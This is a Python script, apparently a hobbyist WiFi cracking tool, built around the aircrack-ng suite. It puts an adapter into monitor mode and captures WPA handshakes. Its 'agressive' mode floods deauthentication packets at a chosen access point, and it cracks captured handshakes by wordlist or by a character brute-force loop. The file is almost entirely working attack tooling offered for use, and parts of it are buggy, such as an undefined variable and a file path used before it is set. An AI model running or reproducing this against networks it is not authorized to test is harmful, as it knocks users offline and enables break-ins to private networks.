import os
import subprocess
import itertools
import time

def wpa():
    try:
        os.system("clear")
        path = input("[#] enter path to save the handshake too [eg: /home/user/captures/ (nothing on the end) ] \n----> ")
        name = input("[#] enter name of of hanshake [eg: handy.cap ] \n----> ")
        os.system("clear")
        print("[#] this takes a cuple of seconds please wait...")
        command = "nmcli dev wifi"
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        n = res.stdout
        n = str(n)
        n = n.split("\n")
        x = 0
        for g in n:
            if "IN-USE" in g or "--" in g:
                pass
            else:
                print(x," ",g)
            x = x + 1
        c = int(input("[#] enter wifi num: "))

        l = n[c]
        l = l.split("  ")
        mac = l[4]
        mac = mac.replace(" ","")
        nn = n[c]
        nn = nn.split("Infra")
        nn = nn[1]
        nn = nn.split(" ")
        ch = nn[2]

        #'''
        os.system("ifconfig")
        interface = input("[#] enter interface: ")
        if "mon" in interface:
            ineterface = interface
        else:
            c = "airmon-ng start "+ interface
            os.system(c)
            os.system("clear")
            ineterface = interface+"mon"

        print("""
        ----[MENU]----

        1. passive capture
        2. agressive capture

        --------------

        """) 
        chh = int(input("---> "))
        print("[#] path: ", path)
        print("[#] MAC: ",mac)
        print("[#] CH: ",ch)
        print("[#] interface: ",ineterface)
        print("[CTRL+C] when u see wpa-hanshake captured press CTRL+C")
        input("[ENTER] run? ")
        if chh == 1:
            try:
                command = "airodump-ng -c "+ch+" --bssid "+mac+" -w cap-temp/ "+ineterface
                os.system(command)
            except KeyboardInterrupt:
                pass
        else:
            print("[#] attacking...")
            command = "xterm -geometry 100x-50-0-0 -e  'aireplay-ng -0 20000 -a "+mac+" "+ ineterface+"' | xterm -geometry 100x50+0+0 -e 'airodump-ng -w cap-temp/ -c "+ch+" --bssid "+mac+" -w cap-temp/ "+ineterface+"'"
            print("[CTRL+C] press CTRL+C on this screen when handshake is captured")
            input("[ENTER] run? ")
            try:
                os.system(command)
            except Exception:
                pass
        print("[#] cleaning temp files...")
        del_file = ["-01.csv","-01.kismet.csv","-01.kismet.netxml","-01.log.csv"]
        os.system("clear")
        for f in del_file:
            c = "rm cap-temp/"+f
            os.system(c)
        os.system("clear")
        c = "mv cap-temp/-01.cap "+ path +""+ name
        os.system(c)
        print("[#] file saved to: "+ path+name)
    #'''
        command = "airmon-ng stop  "+ineterface
        os.system(command)
    except KeyboardInterrupt:
        subprocess.run("clear", shell=True)
        input("[ENTER] continue? ")
def opt1_test():
    min_len = int(input("[#] enter minumium password lentgh: "))
    max_len = int(input("[#] enter maxmimum password: "))
    max_len = max_len + 1
    xx = 0
    input("[ctrl+c] press ctrl+c to quit \n[ENTER] run? ")
    try:
        while min_len != max_len:
            PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnm', repeat=min_len)
            for pas in PASSWORD_LIST:
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(",","")
                pas = pas.replace(" ","")
                pas = pas
                pa = str(pas)
                print("[#] attempt num: ", xx)
                print("[#] attempting: ",pa)
                xx = xx + 1
    except KeyboardInterrupt:
        subprocess.run("clear", shell=True)
        print("[!] last password: ",pa)
        print("[!] attempts: ", xx)
        input("[ENTER] continue? ")
def opt2():
    os.system("clear")
    print("  ------------\n |Airpy-Brute | \n  ------------")
    valid = False
    cap = input("[#] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
    while not valid:
        try:
            open(cap,"rb")
            valid = True
        except Exception:
            os.system("clear")
            print("[!] enter a valid file!")
            cap = input("[#] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
    min_len = int(input("[#] enter minumium password lentgh: "))
    max_len = int(input("[#] enter maxmimum password: "))
    max_len = max_len + 1
    xx = 0
    input("[ctrl+c] press ctrl+c to quit \n[ENTER] run? ")
    try:
        while min_len != max_len:
            PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnm', repeat=min_len) #0123456789ABCDEF
            for pas in PASSWORD_LIST:
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(",","")
                pas = pas.replace(" ","")
                file = open("words.txt","r+")
                pa = str(pas)
                print("[#] attempt num: ", xx)
                print("[#] attempting: ",pa)
                file.write(pa)
                file.close()
                command = "aircrack-ng -a2 -w words.txt "+cap
                res = subprocess.run(command, shell=True, capture_output=True, text=True)
                n = res.stdout
                n = str(n)
                if "KEY FOUND!" in n:
                    print("[#] key: ",ff)
                    input("[ENTER] Key Found! ")
                else:
                    pass
                print(n)
                #subprocess.run("clear", shell=True)
                xx = xx + 1
            min_len = min_len + 1
    except KeyboardInterrupt:
        subprocess.run("clear", shell=True)
        print("[!] last password: ",pa)
        print("[!] attempts: ", xx)
        input("[ENTER] continue? ")
def main():
    run = True
    while run:
        try:
            os.system("clear")
            print("""
            __      __  ____           _ 
            \ \    / / |  _ |  /\     | | 
             \ \/\/ /  |  __| /__\    |_|
              \    /   | |   / __ \    _
               \/\/    |_|  /_/  \_\  |_|
                     cracker

            -------------------------

            1. aircrack + wordlist
            2. Airpy-Brute
            3. capture wpa handshake
            4. test's
            
            -------------------------

            """)

            x = int(input("[#] enter option \n----> "))
            if x == 4:
                os.system("clear")
                print("1. Airpy-Brute speed test")
                xx = int(input("[#] enter option \n----> "))
                if xx == 1:
                    opt1_test()
            if x == 1:
                os.system("clear")
                valid = False
                while not valid:
                    try:
                        open(cap,"rb")
                        valid = True
                    except Exception:
                        os.system("clear")
                        print("[!] enter a valid file!")
                        cap = input("[#] enter path to cap file [eg: /home/user/captures/wifi_101.cap] \n----> ")
                words = input("[#] enter wordlist path [eg: exapmle above] \n----> ")
                valid = False
                words = input("[#] enter wordlist path [eg: exapmle above] \n----> ")
                while not valid:
                    try:
                        open(words,"rb")
                        valid = True
                    except Exception:
                        os.system("clear")
                        print("[!] enter a valid file!")
                        words = input("[#] enter wordlist path [eg: exapmle above] \n----> ")

                command = "aircrack-ng -a2 -w "+ words + " " + cap
                os.system(command)
                input("[ENTER] continue? ")
            if x == 2:
                opt2()
            if x == 3:
                wpa()



        
        except KeyboardInterrupt:
            try:
                print("\n\n[CTRL+C] are you sure? ")
                input("[CTRL+C] press agin if you want to exit if not hit enter ")
            except KeyboardInterrupt:
                run = False
            subprocess.run("clear", shell=True)
